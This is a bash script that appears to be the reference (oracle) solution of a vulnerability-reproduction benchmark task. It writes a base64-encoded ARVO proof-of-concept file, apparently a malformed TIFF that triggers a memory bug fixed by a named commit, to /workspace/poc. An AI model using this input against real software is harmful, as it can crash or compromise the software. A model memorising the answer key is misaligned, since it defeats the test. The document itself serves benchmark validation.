#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 0f013e5b addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
SUkqAAgAAAAPAAABAwABAAAACUH//wEBAwABAAAAZgEAAAIBAwA7AAAAwgAAAAMBAwABAAAABwD//77////6AAB+BgDc/xQBCwABAAAAA+EAABwBAwABAAAAAQAAIEIBAwABAAAAAgEAAEMBAwABAAAAvP8AAEQBAQAHPgEA4AAAAEUBAQA79wQAHAEAAFP+gAABAAWdARD+Gv3/AYTB/bEj/wAAALwCDQAKDBEBcgAAGQAAAAAAAABAPAMAJRoAAAAIAAgEAQABAH8ABkEBAOACAABFAQEAOxQG81RhZyD//t////9bgAAAAP//AP8V/wAA+EAA/////////woh/9j//////9sAQwD+/BUBcwMaOqys4uLilJSUlJSUSUkNAZSUlJSUlFuUlJSUlJSUlDUBAAAAAB8BlJSUlJSUlItvQ2xv/f///9PO0cskAT0yMTwuNTZ4NzU3Nzk1Mzb/wgALCBQ/APUBAREA/8QAFwAAAQMAAAAAAAAAAAAAAAAAAQcAAPz/2gAIAQEPAAAAicdS/A==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
